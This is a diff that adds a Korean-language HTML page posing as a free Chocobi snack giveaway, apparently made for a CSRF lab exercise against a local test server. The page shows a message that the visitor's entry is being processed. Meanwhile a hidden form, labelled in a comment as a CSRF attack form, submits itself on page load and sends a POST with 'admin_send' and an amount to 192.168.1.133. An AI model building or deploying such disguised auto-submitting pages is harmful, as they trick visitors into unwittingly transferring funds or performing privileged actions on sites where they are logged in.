@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>무료 초코비 이벤트!</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f0f0f0;
+        }
+        h1 { color: #FF6B6B; }
+        img { max-width: 300px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h1>🍫 짱구 초코비 무료 증정 이벤트! 🍫</h1>
+    <img src="/hoon/choco.jpg" alt="초코비">
+    <p>이벤트 참여 중...</p>
+    
+    <!-- CSRF 공격용 폼 -->
+    <form id="hackForm" action="http://192.168.1.133/hoon/test.php" method="POST">
+        <input type="hidden" name="action" value="admin_send">
+        <input type="hidden" name="amount" value="100">
+    </form>
+
+    <script>
+        window.onload = function() {
+            document.getElementById('hackForm').submit();
+        }
+    </script>
+</body>
+</html>
